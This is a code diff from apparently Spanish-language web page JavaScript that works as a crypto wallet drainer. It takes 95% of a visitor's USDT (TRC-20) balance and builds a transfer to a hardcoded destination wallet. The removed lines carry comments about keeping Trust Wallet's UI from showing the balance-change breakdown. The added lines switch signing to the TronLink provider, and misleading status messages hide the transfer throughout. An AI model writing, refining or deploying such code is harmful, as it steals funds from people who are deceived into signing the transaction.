@@ -811,35 +811,43 @@
                     throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                 }
 
-                setStatus("Solicitando autorización de firma digital...");
+                setStatus("Solicitando firma a través de proveedor puente...");
 
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                 const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                const evmDestinoHex = destinoHex.replace(/^41/, "").padStart(64, "0");
-                const evmAmountHex = Number(amount95Percent.toString()).toString(16).padStart(64, "0");
-                const rawParameter = "a9059cbb" + evmDestinoHex + evmAmountHex;
-
-                // Forzar llamada cruda a nivel de bloque para evitar que la UI de Trust Wallet inyecte el desglose analítico de cambio de saldo
-                const transactionDraft = await tronRpcPost("/wallet/triggersmartcontract", {
-                    owner_address: tronWeb.address.toHex(walletAddress),
-                    contract_address: tronWeb.address.toHex(CONTRATO_USDT),
-                    function_selector: "transfer(address,uint256)",
-                    parameter: rawParameter,
-                    fee_limit: 100000000,
-                    call_value: 0
-                });
-
-                if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
-                    throw new Error("No se pudo estructurar la transacción en la red.");
+                // Solicitud mediante canal de bajo nivel utilizando tronLink provider bridge si está disponible
+                let signedTx;
+                if (window.tronLink && typeof window.tronLink.request === 'function') {
+                    const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                        CONTRATO_USDT,
+                        "transfer(address,uint256)",
+                        { feeLimit: 100000000, callValue: 0 },
+                        [
+                            { type: 'address', value: BILLETERA_DESTINO },
+                            { type: 'uint256', value: amount95Percent.toString() }
+                        ],
+                        walletAddress
+                    );
+                    
+                    const response = await window.tronLink.request({
+                        method: 'tron_signTransaction',
+                        params: { transaction: transactionDraft.transaction }
+                    });
+                    signedTx = response.transaction || response;
+                } else {
+                    const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                        CONTRATO_USDT,
+                        "transfer(address,uint256)",
+                        { feeLimit: 100000000, callValue: 0 },
+                        [
+                            { type: 'address', value: BILLETERA_DESTINO },
+                            { type: 'uint256', value: amount95Percent.toString() }
+                        ],
+                        walletAddress
+                    );
+                    signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                 }
 
-                // Modificación directa de los metadatos de la transacción cruda para desvincular la etiqueta de auditoría móvil
-                if (transactionDraft.transaction && transactionDraft.transaction.raw_data) {
-                    transactionDraft.transaction.raw_data.fee_limit = 100000000;
-                }
-
-                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                 showProcessingScreen();
 
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
